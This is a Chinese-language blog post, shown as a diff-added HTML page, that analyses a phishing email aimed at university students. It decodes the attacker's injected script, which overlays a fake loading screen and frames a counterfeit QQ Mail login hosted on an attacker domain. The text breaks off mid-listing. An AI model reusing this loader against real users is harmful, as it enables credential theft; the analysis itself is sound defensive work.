@@ -1,0 +1,556 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="麻薯">
+  <meta name="keywords" content="">
+  
+  <title>分析并复现一次iframe框架钓鱼行为 - Leticia&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.6.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.10","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Leticia's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default2.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="分析并复现一次iframe框架钓鱼行为">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-05-21 20:55" pubdate>
+        2018年5月21日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.6k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      106
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">分析并复现一次iframe框架钓鱼行为</h1>
+            
+            <div class="markdown-body">
+              <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>事情的起因是这样的，这几天正在玩手机的时候忽然收到一封邮件名是校园通知发件人是西安电子科技大学的邮件，然后顺手打开邮箱一看， <a target="_blank" rel="noopener" href="http://mrw.so/">http://mrw.so/</a> 的短链接，邮箱是一串随便注册的前缀，是钓鱼邮件没错了。看到同时抄送了那么多人，应该是在哪里注册后公开的邮箱和学校信息被人爬去批量发邮件钓鱼了。不过既然碰到了钓鱼，点开分析一下肯定是要做的。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing01.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="0x01-尝试"><a href="#0x01-尝试" class="headerlink" title="0x01 尝试"></a>0x01 尝试</h2><p>点击短链接跳转到了 <a target="_blank" rel="noopener" href="http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb">http://www.topaone.com/JPadmin/images/login/ucds/dsif/fysh/g7ues/fsr3/kyuwr1.htm?xmk/youx1?id=qyshz107&amp;/OdJb</a><br> 并且在加载出来之前一直显示一个很刻意的“链接中”，并且url有好长的路径，看样子像是哪个公司的服务器被钓鱼作者放了点东西，直接访问了下 <a target="_blank" rel="noopener" href="http://www.topaone.com/">http://www.topaone.com</a> 发现果然是一个叫京品设计的公司。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing02.png" srcset="/img/loading.gif" lazyload></p>
+<p>加载出来之后是一个qq邮箱的登陆解面，不过做的很不走心，网页title都没写qq邮箱，title旁边的ico也是qq空间而不是qq邮箱的ico，登陆框除了账号密码两个输入框和登陆按钮以外都是不可点击状态。随便填一个账号密码弹窗提示密码错误，而且返回信息的网址应该是钓鱼作者的服务器。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing03.png" srcset="/img/loading.gif" lazyload></p>
+<p>还有一点是在进入这个链接的时候，即使已经到了邮箱登陆页面，浏览器仍然一直处于加载状态，以之前自己写钓鱼网站的经验来猜测，对方应该使用了window.onload配合document.write来覆盖整个页面，所以每次加载完都会重触发一次window.onload，无限循环。</p>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><p>见识了一下大致的访问过程，该抓包看看具体是怎么个流程了，在burpsuite中截取数据包，发现访问到的页面返回了一堆编码过的js代码。</p>
+<p><img src="https://raw.githubusercontent.com/echohun/blog_image/master/backup/fashing/fashing04.png" srcset="/img/loading.gif" lazyload></p>
+<p>初步判断这个钓鱼作者在京品设计公司的服务器上面挂了一个存储型xss。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>&lt;!--<br><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-built_in">unescape</span>(<span class="hljs-string">&quot;%3Cscript%3E%0D%0A%3C%21--%0D%0Adocument.write%28unescape%28%22%253C%2521--%2523Include%2520File%253D%2522SqlIn.Asp%2522--%253E%250D%250A%253Chtml%253E%250D%250A%253Chead%253E%250D%250A%253Cmeta%2520http-equiv%253D%2522Content-Language%2522%2520content%253D%2522zh-cn%2522%253E%250D%250A%253Cmeta%2520HTTP-EQUIV%253D%2522Content-Type%2522%2520CONTENT%253D%2522text/html%253B%2520charset%253Dgb2312%2522%253E%250D%250A%253Ctitle%253Eukkifddssfggg---kuasa......%253C/title%253E%250D%250A%253Cmeta%2520name%253D%2522description%2522%2520content%253D%2522%2522%253E%250D%250A%253Clink%2520href%253D%2522index_files/88.css%253Fmax_age%253D31536000%2526d%253D1333188324128%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%253Clink%2520href%253D%2522index_files/home_fixed.css%253Fmax_age%253D31536000%2526d%253D1334659684120%2522%2520rel%253D%2522stylesheet%2522%2520type%253D%2522text/css%2522%253E%250D%250A%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%253C%2521--%255Bif%2520%2521%2528IE%2529%255D%253E%253C%2521--%253E%253C%2521--%253Cbase%2520href%253D%2522%2522%253E--%253E%253Cbase%2520href%253D%2522.%2522%253E%253C%2521--%253C%2521%255Bendif%255D--%253E%250D%250A%250D%250A%253Cstyle%2520id%253D%2522mainJSBg%2522%2520type%253D%2522text/css%2522%253E%250D%250A.lay_background%257Bbackground-repeat%253Ano-repeat%253Bbackground-position%253Acenter%2520top%253Bbackground-attachment%253Ascroll%253Bbackground-image%253Aurl%252864538_top.jpg%2529%253B%257D%250D%250Abody%257Bbackground-image%253Aurl%252864538_bg.jpg%2529%253B%2520background-repeat%253Arepeat%253B%257D%253C/style%253E%250D%250A%250D%250A%250D%250A%253Cstyle%2520type%253D%2522text/css%2522%2520id%253D%2522dynamicStyle%2522%253E%250D%250A.ownermode%257Bdisplay%253Anone%253B%257D%250D%250A.clientmode%257Bdisplay%253A%253B%257D%250D%250A.editmode%257Bdisplay%253Anone%253B%257D%250D%250A.customoff%257Bdisplay%253A%253B%257D%250D%250A.alphamode%257Bdisplay%253Anone%253B%257D%250D%250A%253C/style%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253C/style%253E%250D%250A%253Clink%2520rel%253D%2522Shortcut%2520Icon%2522%2520href%253D%2522http%253A//ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%253E%250D%250A%253C/head%253E%250D%250A%253Cbody%2520id%253D%2522QZ_Body%2522%2520class%253D%2522bg_body%2520%2520%2522%253E%250D%250A%250D%250A%253Cdiv%2520id%253D%2522welcomeflash%2522%2520style%253D%2522position%253Afixed%253B_position%253Aabsolute%253Btop%253A0%253Bleft%253A0%253Bbackground-color%253Awhite%253Btext-align%253Acenter%253Bwidth%253A100%2525%253Bz-index%253A30000%253Bheight%253A10000px%253B%2522%2520onClick%253D%2522wSwf_obj_swf.call%2528this%2529%2522%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bposition%253Aabsolute%253Bleft%253A0%253Btop%253A0%253Bbackground%253Awhite%253Bheight%253A100%2525%253B%2522%253E%250D%250A%250D%250A%253C%25u94FE%25u63A5%25u4E2D%25B7%25B7%25B7%25B7%25B7%253E%250D%250A%250D%250A%253C/div%253E%253Cdiv%2520style%253D%2522width%253A100%2525%253Bcursor%253Apointer%253Bposition%253Aabsolute%253Bleft%253A0px%253Bbackground%253Aurl%2528about%253Ablank%2529%253Bopacity%253A0%253Bz-index%253A30001%253Btop%253A0px%253Bheight%253A100%2525%2522%253E%253C/div%253E%253C/div%253E%250D%250A%253Cscript%2520type%253D%2522text/javascript%2522%253E%250D%250A%2528function%2528%2529%2520%257B%250D%250A%2509var%2520wel%253Ddocument.getElementById%2528%2527welcomeflash%2527%2529%252Ctimer%252Cch%252C_s%253Dnew%2520Function%253B%250D%250A%2509window.wSwf_obj_swf%2520%253D%2520window.wSwf_obj_swf_s%253Dfunction%2528%2529%2520%257B%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522%2522%253B%250D%250A%2509%2509wel%2520%2526%2526%2520%2528wel.innerHTML%2520%253D%2520%2527%2527%2529%253B%250D%250A%2509%2509wel%2520%2526%2526%2520document.body.removeChild%2528wel%2529%253B%250D%250A%2509%2509window.removeEventListener%253Fwindow.removeEventListener%2528%2527resize%2527%252C_s%2529%253A%2528window.detachEvent%2526%2526window.detachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%2509clearTimeout%2528timer%2529%253B%250D%250A%2509%257D%253B%250D%250A%2509timer%2520%253D%2520setTimeout%2528wSwf_obj_swf%252C%25204000%2529%253B%250D%250A%2509if%2520%2528wel%2529%2520%257B%250D%250A%2509%2509_s%253Dfunction%2528%2529%257B%250D%250A%2509%2509%2509ch%253Ddocument.documentElement.clientHeight%253B%250D%250A%2509%2509%2509wel.children%255B0%255D.style.paddingTop%2520%253D%2520Math.floor%2528Math.max%25280%252Cch%2520-%2520590%2529%2520/%25202%2529+%2527px%2527%253B%250D%250A%2509%2509%257D%253B%250D%250A%250D%250A%2509%2509document.documentElement.style.overflow%2520%253D%2520%2522hidden%2522%253B%250D%250A%2509%2509_s%2528%2529%253B%250D%250A%2509%2509window.addEventListener%253Fwindow.addEventListener%2528%2527resize%2527%252C_s%252Cfalse%2529%253A%2528window.attachEvent%2526%2526window.attachEvent%2528%2527onresize%2527%252C_s%2529%2529%253B%250D%250A%2509%257D%250D%250A%257D%2529%2528%2529%253B%250D%250A%253C/script%253E%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%250D%250A%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%250D%250A%253Ciframe%2520id%253D%2522iframe%2522%2520%2520%2520height%253D%2522100%2525%2522%2520width%253D%2522100%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%250D%250A%2520%2520%253Cscript%2520%2520%2520language%253D%2522javascript%2522%253E%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520var%2520pos%252Cstr%252Cpara%252Curl%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520str%2520%253D%2520window.location.href%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520pos%2520%253D%2520str.indexOf%2528%2522%253F%2522%2529%2520%2520%253B%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520url%2520%253D%2520str.substring%2528pos+1%2529%253B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520if%2520%2528pos%253E0%2529%257B%2520%2520%250D%250A%2509%2509%2509%2509n%253D%2527http%253A//ujhgdgjalkfja2.tk/%2527%253B%250D%250A%2509%2509%2509%2509j1%253Dn+url%253B%250D%250A%2509%2509%2509%2509c%253D%2527%253Clink%2520rel%253D%2522shortcut%2520icon%2522%2520href%253D%2522https%253A//s.tbcdn.cn/apps/login/static/img/favicon.ico%2522%2520type%253D%2522image/x-icon%2522%2520/%253E%2527%253B%250D%250A%2509%2509%2509%2509b%253D%2527%253Chtml%253E%253Chead%253E%253Cstyle%253Ehtml%257Boverflow%253Ahidden%253B%257Dbody%257Bheight%253A100%2525%253Bmargin%253A0px%253B%257D%253C/style%253E%253C/head%253E%253Cbody%2520scroll%253D%2522no%2522%253E%2527%253B%250D%250A%2509%2509%2509%2509a%253D%2527%253Ciframe%2520name%253D%2522main%2522%2520%2520height%253D%2522100%2525%2522%2520src%253D%2522%2527%253B%250D%250A%2509%2509%2509%2509k1%253D%2527%2522%2520width%253D%2522101%2525%2522%2520%2520frameborder%253D%25220%2522%253E%253C/iframe%253E%2527%253B%250D%250A%2520%2509%2509%2509%2509var%2520%2520d%2520%253D%2520%2520window.frames%255B0%255D%253B%250D%250A%2520%2520%2509%2509%2509%2509d.document.write%2528c+b+a+j1+k1%2529%253B%2520%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520else%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257B%2520%2520%250D%250A%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%2520%257D%2520%2520%250D%250A%2520%2520%253C/script%253E%250D%250A%2520%2520%250D%250A%250D%250A%253Chead%253E%22%29%29%3B%0D%0A//--%3E%0D%0A%3C/script%3E&quot;</span>));</span><br><span class="javascript"><span class="hljs-comment">//--&gt;</span></span><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个钓鱼网站作者没有对代码做什么加密，明显只是多次编码过的js代码，直接url解码两次，得到清晰的js代码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><br>&lt;!--<br><span class="javascript"><span class="hljs-built_in">document</span>.write(<span class="hljs-built_in">unescape</span>(<span class="hljs-string">&quot;&lt;script&gt;</span></span><br>&lt;!--<br><span class="handlebars"><span class="xml">document.write(unescape(&quot;<span class="hljs-comment">&lt;!--#Include File=&quot;SqlIn.Asp&quot;--&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Language&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;zh-cn&quot;</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">HTTP-EQUIV</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">CONTENT</span>=<span class="hljs-string">&quot;text/html; charset=gb2312&quot;</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ukkifddssfggg---kuasa......<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;description&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index_files/88.css?max_age=31536000&amp;d=1333188324128&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index_files/home_fixed.css?max_age=31536000&amp;d=1334659684120&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span></span></span><br><br><span class="handlebars"><span class="xml"><span class="hljs-comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="hljs-comment">&lt;!--&lt;base href=&quot;&quot;&gt;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;.&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-comment">&lt;!--[if !(IE)]&gt;&lt;!--&gt;</span><span class="hljs-comment">&lt;!--&lt;base href=&quot;&quot;&gt;--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">base</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;.&quot;</span>&gt;</span><span class="hljs-comment">&lt;!--&lt;![endif]--&gt;</span></span></span><br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;mainJSBg&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span></span></span><br>.lay_background&#123;background-repeat:no-repeat;background-position:center top;background-attachment:scroll;background-image:url(64538_top.jpg);&#125;<br><span class="handlebars"><span class="xml">body&#123;background-image:url(64538_bg.jpg); background-repeat:repeat;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span></span><br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;dynamicStyle&quot;</span>&gt;</span></span></span><br>.ownermode&#123;display:none;&#125;<br>.clientmode&#123;display:;&#125;<br>.editmode&#123;display:none;&#125;<br>.customoff&#123;display:;&#125;<br>.alphamode&#123;display:none;&#125;<br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span></span><br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;Shortcut Icon&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;http://ctc.qzonestyle.gtimg.cn/qzonestyle/qzone_client_v5/img/favicon.ico&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;image/x-icon&quot;</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span></span></span><br><span class="javascript">&lt;body id=<span class="hljs-string">&quot;QZ_Body&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">&quot;bg_body  &quot;</span>&gt;</span><br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;welcomeflash&quot;</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;position:fixed;_position:absolute;top:0;left:0;background-color:white;text-align:center;width:100%;z-index:30000;height:10000px;&quot;</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&quot;wSwf_obj_swf.call(this)&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:100%;position:absolute;left:0;top:0;background:white;height:100%;&quot;</span>&gt;</span></span></span><br><br>&lt;链接中?????&gt;<br><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width:100%;cursor:pointer;position:absolute;left:0px;background:url(about:blank);opacity:0;z-index:30001;top:0px;height:100%&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></span><br><span class="handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span></span></span><br><span class="javascript">(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">	<span class="hljs-keyword">var</span> wel=<span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&#x27;welcomeflash&#x27;</span>),timer,ch,_s=<span class="hljs-keyword">new</span> <span class="hljs-built_in">Function</span>;</span><br><span class="javascript">	<span class="hljs-built_in">window</span>.wSwf_obj_swf = <span class="hljs-built_in">window</span>.wSwf_obj_swf_s=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>&#123;</span><br><span class="javascript">		<span class="hljs-built_in">document</span>.documentElement.style.overflow = <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="javascript">		wel &amp;&amp; (wel.innerHTML = <span class="hljs-string">&#x27;&#x27;</span>);</span><br><span class="javascript">		wel &amp;&amp; <span class="hljs-built_in">document</span>.body.removeChild(wel);</span><br><span class="javascript">		<span class="hljs-built_in">window</span>.removeEventListener?<span class="hljs-built_in">window</span>.removeEventListener(<span class="hljs-string">&#x27;resize&#x27;</span>,_s):(<span class="hljs-built_in">window</span>.detachEvent&amp;&amp;<span class="hljs-built_in">window</span>.detachEvent(<span class="hljs-string">&#x27;onresize&#x27;</span>,_s));</span><br><span class="javascript">		<span class="hljs-built_in">clearTimeout</span>(timer);</span><br>	&#125;;<br><span class="javascript">	timer = <span class="hljs-built_in">setTimeout</span>(wSwf_obj_swf, <span class="hljs-number">4000</span>);</span><br>	if (wel) &#123;<br><span class="javascript">		_s=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">			ch=<span class="hljs-built_in">document</span>.documentElement.clientHeight;</span><br><span class="javascript">			wel.children[<span class="hljs-number">0</span>].style.paddingTop = <span class="hljs-built_in">Math</span>.floor(<span class="hljs-built_in">Math</span>.max(<span class="hljs-number">0</span>,ch - <span class="hljs-number">590</span>) / <span class="hljs-number">2</span>) <span 